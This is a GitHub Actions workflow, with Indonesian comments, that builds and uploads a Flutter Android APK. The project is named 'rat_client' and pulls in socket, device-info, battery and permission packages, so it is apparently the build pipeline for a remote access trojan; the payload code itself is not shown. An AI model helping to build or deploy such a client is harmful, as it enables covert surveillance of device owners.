name: Build APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v3
        with:
          distribution: 'zulu'
          java-version: '17'

      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          flutter-version: '3.19.0'

      # 1. Buat project Android
      - name: Initialize Project
        run: flutter create --platforms=android --org com.example --project-name rat_client .

      # 2. SUNTIKKAN V2 KE FOLDER ANDROID (Supaya battery_plus tidak error)
      - name: Fix Android Embedding
        run: |
          echo "flutterEmbedding=2" >> android/local.properties
          
      # 3. Timpa main.dart kamu
      - name: Overwrite Main Dart
        run: cp lib/main.dart lib/main.dart

      # 4. Tambahkan dependencies
      - name: Add Dependencies
        run: flutter pub add socket_io_client device_info_plus battery_plus permission_handler

      # 5. Build
      - name: Build APK
        run: flutter build apk --release

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: rat-apk
          path: build/app/outputs/flutter-apk/app-release.apk
